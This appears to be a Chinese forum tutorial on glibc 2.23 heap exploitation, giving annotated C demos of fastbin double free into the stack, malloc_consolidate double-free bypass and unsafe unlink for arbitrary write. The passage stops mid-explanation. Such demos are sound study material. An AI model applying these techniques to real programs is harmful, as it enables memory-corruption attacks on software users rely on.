
# fastbin_dup_into_stack

```
#include <stdio.h>

#include <stdlib.h>

#include <string.h>



int main()

{

    fprintf(stderr, "这个例子拓展自 fastbin_dup.c，通过欺骗 malloc 使得返回一个指向受控位置的指针（本例为栈上）\n");

    unsigned long long stack_var;



    fprintf(stderr, "我们想通过 malloc 申请到 %p.\n", 8+(char *)&stack_var);



    fprintf(stderr, "先申请3 个 chunk\n");

    char* a = malloc(8);

    strcpy(a, "AAAAAAAA");

    char* b = malloc(8);

    strcpy(b, "BBBBBBBB");

    char* c = malloc(8);

    strcpy(c, "CCCCCCCC");

    

    fprintf(stderr, "chunk a: %p\n", a);

    fprintf(stderr, "chunk b: %p\n", b);

    fprintf(stderr, "chunk c: %p\n", c);



    fprintf(stderr, "free 掉 chunk a\n");

    free(a);



    fprintf(stderr, "如果还对 %p 进行 free, 程序会崩溃。因为 %p 现在是 fastbin 的第一个\n", a, a);

    // free(a);

    fprintf(stderr, "先对 b %p 进行 free\n", b);

    free(b);



    fprintf(stderr, "接下来就可以对 %p 再次进行 free 了, 现在已经不是它在 fastbin 的第一个了\n", a);

    free(a);



    fprintf(stderr, "现在 fastbin 的链表是 [ %p, %p, %p ] 接下来通过修改 %p 上的内容来进行攻击.\n", a, b, a, a);

    unsigned long long *d = malloc(8);



    fprintf(stderr, "第一次 malloc(8): %p\n", d);

    char* e = malloc(8);

    strcpy(e, "EEEEEEEE");

    fprintf(stderr, "第二次 malloc(8): %p\n", e);

    fprintf(stderr, "现在 fastbin 表中只剩 [ %p ] 了\n", a);

    fprintf(stderr, "接下来往 %p 栈上写一个假的 size，这样 malloc 会误以为那里有一个空闲的 chunk，从而申请到栈上去\n", a);

    stack_var = 0x20;



    fprintf(stderr, "现在覆盖 %p 前面的 8 字节，修改 fd 指针指向 stack_var 前面 0x20 的位置\n", a);

    *d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

    

    char* f = malloc(8);

    strcpy(f, "FFFFFFFF");

    fprintf(stderr, "第三次 malloc(8): %p, 把栈地址放到 fastbin 链表中\n", f);

    char* g = malloc(8);

    strcpy(g, "GGGGGGGG");

    fprintf(stderr, "这一次 malloc(8) 就申请到了栈上去: %p\n", g);

}
```

`gcc -g fastbin_dup_into_stack.c`

这个程序展示了怎样通过修改指针，将其指向一个伪造的 free chunk，在伪造的地址处 `malloc()` 出一个 chunk。该程序大部分内容都和上一个程序一样，漏洞也同样是 double-free，只有给 `fd` 填充的内容不一样。

三次 `malloc()` 之后：

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_U8XE5B9RSECQW23.jpg "image.png")

三次 `free()` 之后，可以看到由于 double free 造成的循环的指针：

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_9DD9T8JPRYRMX3X.jpg "image.png")

这时候我们再去 `malloc()` 两次，还剩一个指向 chunk `a` 的 free chunk，而前面我们也申请到了指向它的 chunk `d`，可以通过它编辑 chunk `a` 的 `fd` 指针，填充一个有意义的地址：栈地址减 `0x8`（因为伪造的 chunk 要有个 `size`，`size` 在 `&stack_var - 0x8` 的位置上）。

`*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));`

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_AA7DGMNVWPSY3ZR.jpg "image.png")

这样 `malloc()` 一次之后再次申请的时候会申请到 `fd` 指针指向的 `0x00007fffffffdcb0`：

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_BVAQ3AFM363AW7H.jpg "image.png")

# fastbin_dup_consolidate

ubuntu16.04 glibc 2.23

`gcc -g fastbin_dup_consolidate.c`

```
#include <stdio.h>

#include <stdint.h>

#include <stdlib.h>

#include <string.h>



int main() {

  void* p1 = malloc(0x40);

  strcpy(p1, "AAAAAAAA");

  void* p2 = malloc(0x40);

  strcpy(p2, "BBBBBBBB");

  fprintf(stderr, "申请两个 fastbin 范围内的 chunk: p1=%p p2=%p\n", p1, p2);

  fprintf(stderr, "先 free p1\n");

  free(p1);

  void* p3 = malloc(0x400);

  fprintf(stderr, "去申请 largebin 大小的 chunk，触发 malloc_consolidate(): p3=%p\n", p3);

  fprintf(stderr, "因为 malloc_consolidate(), p1 会被放到 unsorted bin 中\n");

  free(p1);

  fprintf(stderr, "这时候 p1 不在 fastbin 链表的头部了，所以可以再次 free p1 造成 double free\n");

  void* p4 = malloc(0x40);

  strcpy(p4, "CCCCCCC");

  void* p5 = malloc(0x40);

  strcpy(p5, "DDDDDDDD");

  fprintf(stderr, "现在 fastbin 和 unsortedbin 中都放着 p1 的指针，所以我们可以 malloc 两次都到 p1: %p %p\n", p4, p5);

}
```

这个例子展示了在 large bin 的分配中 `malloc_consolidate()` 机制绕过 fastbin 对 double free 的检查。

一开始分配了两次之后：

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_KTAH6YR6W92TN64.jpg "image.png")

释放掉 `p1` 之后，放到了 fastbins 中：

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_3DBMRR7WNFACSVG.jpg "image.png")

此时分配了一个 large chunk 即：`void *p3 = malloc(0x400);`

fastbins 中的 chunk 已经没有了，在 small bins 出现了，同时 chunk 2 的 `size` 和 `prev_size` 都被修改了：

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_CFRM65AFXHMGJFP.jpg "image.png")

在分配 large chunk 的时候，首先会根据 chunk 的大小来获取对应的 large bin 的 index，然后判断 fast bins 中有没有 chunk，如果有就调用 `malloc_consolidate()` 合并 fast bins 中的 chunk，然后放到 unsorted bin 中。unsorted bin 中的 chunk 会按照大小放到 small 或 large bins 中。

`p1` 已经不再 fastbin 的顶部，所以可以再次 `free()`。

`p1` 既在 small bins 又在 fast bins：

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_2MVNNHD6H387KU4.jpg "image.png")

再一次 `malloc()` 之后会从 fast bins 中分配：

```
void *p4 = malloc(0x10);
strcpy(p4, "CCCCCCC");
```

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_JQ9TAF63AFK5AGA.jpg "image.png")

再一次就是从 small bins 中分配：

```
void *p5 = malloc(0x10);
strcpy(p5, "DDDDDDDD");
```

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_G8K9DESWDPBS3R6.jpg "image.png")

`p4` 和 `p5` 被分配在了同一个地方。

# unsafe_unlink

ubuntu16.04 glibc 2.23

这个程序展示了怎样利用 `free()` 改写全局指针 `chunk0_ptr` 达到任意内存写的目的，即 unsafe unlink。

```
#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include <stdint.h>



uint64_t *chunk0_ptr;



int main()

{

    fprintf(stderr, "当您在已知位置有指向某个区域的指针时，可以调用 unlink\n");

    fprintf(stderr, "最常见的情况是易受攻击的缓冲区，可能会溢出并具有全局指针\n");



    int malloc_size = 0x80; //要足够大来避免进入 fastbin

    int header_size = 2;



    fprintf(stderr, "本练习的重点是使用 free 破坏全局 chunk0_ptr 来实现任意内存写入\n\n");



    chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0

    uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1

    fprintf(stderr, "全局变量 chunk0_ptr 在 %p, 指向 %p\n", &chunk0_ptr, chunk0_ptr);

    fprintf(stderr, "我们想要破坏的 chunk 在 %p\n", chunk1_ptr);



    fprintf(stderr, "在 chunk0 那里伪造一个 chunk\n");

    fprintf(stderr, "我们设置 fake chunk 的 'next_free_chunk' (也就是 fd) 指向 &chunk0_ptr 使得 P->fd->bk = P.\n");

    chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);

    fprintf(stderr, "我们设置 fake chunk 的 'previous_free_chunk' (也就是 bk) 指向 &chunk0_ptr 使得 P->bk->fd = P.\n");

    fprintf(stderr, "通过上面的设置可以绕过检查: (P->fd->bk != P || P->bk->fd != P) == False\n");

    chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);

    fprintf(stderr, "Fake chunk 的 fd: %p\n",(void*) chunk0_ptr[2]);

    fprintf(stderr, "Fake chunk 的 bk: %p\n\n",(void*) chunk0_ptr[3]);



    fprintf(stderr, "现在假设 chunk0 中存在一个溢出漏洞，可以更改 chunk1 的数据\n");

    uint64_t *chunk1_hdr = chunk1_ptr - header_size;

    fprintf(stderr, "通过修改 chunk1 中 prev_size 的大小使得 chunk1 在 free 的时候误以为 前面的 free chunk 是从我们伪造的 free chunk 开始的\n");

    chunk1_hdr[0] = malloc_size;

    fprintf(stderr, "如果正常的 free chunk0 的话 chunk1 的 prev_size 应该是 0x90 但现在被改成了 %p\n",(void*)chunk1_hdr[0]);

    fprintf(stderr, "接下来通过把 chunk1 的 prev_inuse 改成 0 来把伪造的堆块标记为空闲的堆块\n\n");

    chunk1_hdr[1] &= ~1;



    fprintf(stderr, "现在释放掉 chunk1，会触发 unlink，合并两个 free chunk\n");

    free(chunk1_ptr);



    fprintf(stderr, "此时，我们可以用 chunk0_ptr 覆盖自身以指向任意位置\n");

    char victim_string[8];

    strcpy(victim_string,"Hello!~");

    chunk0_ptr[3] = (uint64_t) victim_string;



    fprintf(stderr, "chunk0_ptr 现在指向我们想要的位置，我们用它来覆盖我们的 victim string。\n");

    fprintf(stderr, "之前的值是: %s\n",victim_string);

    chunk0_ptr[0] = 0x4141414142424242LL;

    fprintf(stderr, "新的值是: %s\n",victim_string);

}
```

`unlink()` 有一个保护检查机制，它会检查这个 chunk 的前一个 chunk 的 `bk` 指针是不是指向这个 chunk（后一个也一样）。

先在 `main()` 函数上设置一个断点，然后单步走一下，走到第 13 行（不包括）。

我们来看一下，申请了两个堆之后的情况：

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_GMX2KCR274AX2JE.jpg "image.png")

上面说的那个检查 `fd`/`bk` 指针是通过 chunk 头部的相对地址来找的，我们可以用全局指针 `chunk0_ptr` 构造一个假的 chunk 来绕过。

再单步走到第 40 行（这里是后来补的图，地址大了 `0x1000`）：

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_NAAAWVDZM6FTDKE.jpg "image.png")

在伪造 `fd` 跟 `bk` 这个地方，这两行代码做了个减法，使得从这个地方数起来正好可以数到我们伪造的哪一个 fake chunk：

```
chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
```

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_V7CHSWAPGWG8ZDX.jpg "image.png")

上面那个图没对齐，用文本来解释一下。
